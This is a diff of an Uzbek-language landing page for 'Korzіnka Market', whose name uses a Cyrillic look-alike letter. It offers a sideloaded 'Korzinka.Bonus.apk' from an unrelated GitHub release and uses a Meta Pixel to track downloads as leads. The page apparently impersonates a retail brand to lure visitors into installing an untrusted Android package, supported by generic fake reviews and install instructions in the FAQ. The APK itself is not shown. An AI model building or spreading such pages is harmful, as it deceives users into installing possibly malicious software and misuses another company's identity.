@@ -4,25 +4,40 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Market Bonus</title>
+<title>Korzіnka Market</title>
 
-<!-- Meta Pixel Code -->
 <script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;
+n=f.fbq=function(){
+n.callMethod?
+n.callMethod.apply(n,arguments):
+n.queue.push(arguments)
+};
+
+if(!f._fbq)f._fbq=n;
+n.push=n;
+n.loaded=true;
+n.version='2.0';
+n.queue=[];
+
+t=b.createElement(e);
+t.async=true;
+t.src=v;
+
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s);
+
+}(window,document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '2491403044633394');
-fbq('track', 'PageView');
+
+fbq('init','2491403044633394');
+fbq('track','PageView');
+
+function trackDownload(){
+fbq('track','Lead');
+}
 </script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=2491403044633394&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
 
 <style>
 
@@ -34,135 +49,123 @@ font-family:Arial,sans-serif;
 }
 
 body{
-background:#f4f7f4;
-padding:20px;
-padding-bottom:100px;
+background:#f5f7fa;
 color:#1f2937;
+line-height:1.6;
 }
 
 .container{
-max-width:460px;
+width:90%;
+max-width:1200px;
 margin:auto;
 }
 
-.card{
+header{
 background:white;
-border-radius:30px;
-padding:25px;
-box-shadow:0 12px 35px rgba(0,0,0,.08);
-animation:fade .8s ease;
+padding:20px 0;
+border-bottom:1px solid #eee;
 }
 
-@keyframes fade{
-from{
-opacity:0;
-transform:translateY(20px)
+.nav{
+display:flex;
+justify-content:space-between;
+align-items:center;
 }
-to{
-opacity:1;
-transform:none
-}
+
+.logo-wrap{
+display:flex;
+align-items:center;
+gap:12px;
 }
 
 .logo{
-width:95px;
-height:95px;
-display:block;
-margin:auto;
-margin-bottom:15px;
-border-radius:22px;
+width:50px;
+height:50px;
+border-radius:14px;
 object-fit:cover;
 }
 
-h1{
-text-align:center;
-margin-bottom:8px;
+.hero{
+padding:70px 0;
 }
 
-.subtitle{
-text-align:center;
-font-size:14px;
+.hero-grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:50px;
+align-items:center;
+}
+
+.hero h1{
+font-size:48px;
+margin-bottom:20px;
+}
+
+.hero p{
 color:#666;
-margin-bottom:20px;
-}
-
-.stats{
-display:flex;
-justify-content:space-between;
-margin-bottom:20px;
-text-align:center;
-}
-
-.stats div{
-flex:1;
-}
-
-.stats b{
-display:block;
-color:#e53935;
-font-size:20px;
-}
-
-.badges{
-display:flex;
-gap:8px;
-justify-content:center;
-flex-wrap:wrap;
-margin-bottom:20px;
-}
-
-.badges span{
-background:#f1f5f1;
-padding:8px 12px;
-border-radius:20px;
-font-size:12px;
-}
-
-.banner{
-background:linear-gradient(135deg,#2e7d32,#43a047);
-padding:18px;
-border-radius:18px;
-color:white;
-margin-bottom:20px;
+margin-bottom:30px;
 }
 
 .download{
-display:block;
-text-align:center;
-text-decoration:none;
-padding:16px;
-font-weight:bold;
-background:#e53935;
+display:inline-block;
+padding:16px 30px;
+background:#2e7d32;
 color:white;
+border-radius:14px;
+text-decoration:none;
+font-weight:bold;
+}
+
+.phone{
+width:100%;
+max-width:320px;
+display:block;
+margin:auto;
+border-radius:30px;
+box-shadow:0 20px 40px rgba(0,0,0,.15);
+}
+
+.features{
+padding:80px 0;
+background:white;
+}
+
+.grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:20px;
+}
+
+.card{
+padding:25px;
+background:#f7f7f7;
 border-radius:18px;
-margin-top:15px;
-box-shadow:0 8px 25px rgba(229,57,53,.35);
 }
 
-.gallery{
-display:flex;
-gap:10px;
-overflow:auto;
-margin-top:15px;
+.about{
+padding:80px 0;
 }
 
-.gallery img{
-width:150px;
-border-radius:16px;
-cursor:pointer;
+.reviews{
+padding:80px 0;
+background:white;
 }
 
 .review{
-margin-top:10px;
-padding:14px;
+padding:20px;
 background:#f7f7f7;
-border-radius:14px;
+border-radius:16px;
+margin-top:15px;
 }
 
 .faq{
+padding:80px 0;
+}
+
+.item{
+background:white;
+padding:20px;
 margin-top:10px;
-background:#f7f7f7;
-padding:14px;
 border-radius:14px;
 cursor:pointer;
 }
@@ -173,26 +176,29 @@ padding-top:10px;
 color:#666;
 }
 
-.fixed{
-position:fixed;
-left:50%;
-transform:translateX(-50%);
-bottom:15px;
-width:90%;
-max-width:460px;
+footer{
+padding:40px 0;
+background:#111827;
+color:white;
+text-align:center;
+}
+
+@media(max-width:900px){
+
+.hero-grid{
+grid-template-columns:1fr;
+text-align:center;
+}
+
+.grid{
+grid-template-columns:1fr;
+}
+
 }
 
 </style>
 
 <script>
-
-function openImg(src){
-const w=window.open("");
-w.document.write(
-'<img src="'+src+'" style="width:100%">'
-);
-}
-
 function faq(id){
 
 let x=document.getElementById(id);
@@ -203,136 +209,170 @@ x.style.display==="block"
 :"block";
 
 }
-
 </script>
 
 </head>
 
 <body>
-  
-<div class="container">
 
-<div class="card">
+<header>
 
+<div class="container nav">
+
+<div class="logo-wrap">
 <img src="logo.png" class="logo">
-
-<h1>Market Bonus</h1>
-
-<div class="subtitle">
-Mahsulotlar va bonus tizimi bir joyda
-</div>
-
-<div class="stats">
-
-<div>
-<b>500K+</b>
-<span>Foydalanuvchi</span>
+<h2>Korzіnka Market</h2>
 </div>
 
 <div>
-<b>4.9★</b>
-<span>Reyting</span>
+Mobil ilova
 </div>
+
+</div>
+
+</header>
+
+<section class="hero">
+
+<div class="container hero-grid">
 
 <div>
-<b>24/7</b>
-<span>Faol</span>
-</div>
 
-</div>
-
-<div class="badges">
-
-<span>🥦 Yangi mahsulotlar</span>
-<span>🎁 Bonuslar</span>
-<span>🚚 Tez xizmat</span>
-
-</div>
-
-<div class="banner">
-
-<h3>🎁 Maxsus bonus</h3>
+<h1>
+Mahsulotlar va xizmatlar mobil ilovasi
+</h1>
 
 <p>
-Yangi foydalanuvchilar uchun chegirmalar va takliflar
+Qulay foydalanish, mahsulotlarni ko‘rish va mobil qurilmalarda ishlash uchun mo‘ljallangan ilova.
+</p>
+
+<a class="download"
+href="https://github.com/KIQrst11/Per-ro/releases/download/v1.0/Korzinka.Bonus.apk"
+onclick="trackDownload()">
+
+Ilovani yuklab olish
+
+</a>
+
+</div>
+
+<div>
+
+<img src="phone.png" class="phone">
+
+</div>
+
+</div>
+
+</section>
+
+<section class="features">
+
+<div class="container">
+
+<h2 style="margin-bottom:30px">
+Asosiy imkoniyatlar
+</h2>
+
+<div class="grid">
+
+<div class="card">
+<h3>Mobil interfeys</h3>
+<p>Qulay va sodda dizayn.</p>
+</div>
+
+<div class="card">
+<h3>Mahsulotlar</h3>
+<p>Katalog va xizmatlar.</p>
+</div>
+
+<div class="card">
+<h3>Android</h3>
+<p>Mobil qurilmalar bilan mos.</p>
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+<section class="about">
+
+<div class="container">
+
+<h2>Ilova haqida</h2>
+
+<p style="margin-top:20px">
+Korzіnka Market mobil foydalanish uchun yaratilgan platforma bo‘lib, foydalanuvchilar uchun qulay interfeysni taqdim etadi.
 </p>
 
 </div>
 
-<a class="download"
-href="https://github.com/KIQrst11/koryinlld/releases/download/v1.0/Korzinka.Bonus.apk"
-onclick="fbq('track','Lead')">
+</section>
 
-⬇ Yuklab olish
+<section class="reviews">
 
-</a>
+<div class="container">
 
-<h3 style="margin-top:25px">
-Ilova skrinshotlari
-</h3>
-
-<div class="gallery">
-
-<img src="assets/img1.png"
-onclick="openImg(this.src)">
-
-<img src="assets/img2.png"
-onclick="openImg(this.src)">
-
-<img src="assets/img3.png"
-onclick="openImg(this.src)">
-
-</div>
-
-<h3 style="margin-top:25px">
-Fikrlar
-</h3>
+<h2>Fikrlar</h2>
 
 <div class="review">
-★★★★★ Juda qulay foydalanish
+Qulay interfeys va oddiy foydalanish.
 </div>
 
 <div class="review">
-★★★★★ Tez ishlaydi
+Mobil qurilmada yaxshi ishlaydi.
 </div>
 
 <div class="review">
-★★★★★ Interfeys juda yoqdi
+Tez va qulay.
 </div>
 
-<h3 style="margin-top:25px">
-FAQ
-</h3>
-
-<div class="faq" onclick="faq('a1')">
-Ilovani qanday o'rnataman?
-<div id="a1" class="answer">
-APK yuklab olib oching
-</div>
 </div>
 
-<div class="faq" onclick="faq('a2')">
+</section>
+
+<section class="faq">
+
+<div class="container">
+
+<h2>FAQ</h2>
+
+<div class="item" onclick="faq('a1')">
+
+Ilova qanday o'rnatiladi?
+
+<div class="answer" id="a1">
+APK faylni yuklab olib o'rnatishni boshlang.
+</div>
+
+</div>
+
+<div class="item" onclick="faq('a2')">
+
 Android ishlaydimi?
-<div id="a2" class="answer">
-Ha, Android qo'llab-quvvatlanadi
+
+<div class="answer" id="a2">
+Ha.
 </div>
-</div>
-
-</div>
-
-<div class="fixed">
-
-<a class="download"
-href="https://github.com/KIQrst11/koryinlld/releases/download/v1.0/Korzinka.Bonus.apk"
-onclick="fbq('track','Lead')">
-
-⬇ Yuklab olish
-
-</a>
 
 </div>
 
 </div>
+
+</section>
+
+<footer>
+
+<div class="container">
+
+Korzіnka Market © 2026<br>
+support@KorzіnkaMarket.com
+
+</div>
+
+</footer>
 
 </body>
 </html>
